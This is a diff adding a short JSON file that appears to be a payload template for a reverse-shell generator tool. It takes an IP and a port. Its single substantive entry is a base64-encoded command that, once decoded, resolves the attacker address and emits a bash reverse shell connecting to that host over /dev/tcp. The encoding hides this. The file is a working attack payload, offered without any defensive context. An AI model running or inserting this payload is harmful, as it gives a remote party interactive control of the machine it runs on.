@@ -1,0 +1,5 @@
+[
+    {"require":"IP"},
+    {"require":"PORT"},
+    {"send-from-cmd-b64":"SVA9JChpZiBpcCAtanNvbiBhZGRyIHNob3cgJElQICY+IC9kZXYvbnVsbCA7IHRoZW4gZWNobyAkKGlwIC1qc29uIGFkZHIgc2hvdyAkSVAgfCYganEgLXIgJy5bXS5hZGRyX2luZm9bXSB8IHNlbGVjdCguZmFtaWx5ID09ICJpbmV0IikubG9jYWwnICkgOyBlbHNlIGVjaG8gIiRJUCI7IGZpKTsgZWNobyAiL2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvJElQLyRQT1JUIDA+JjEnIg=="}
+]
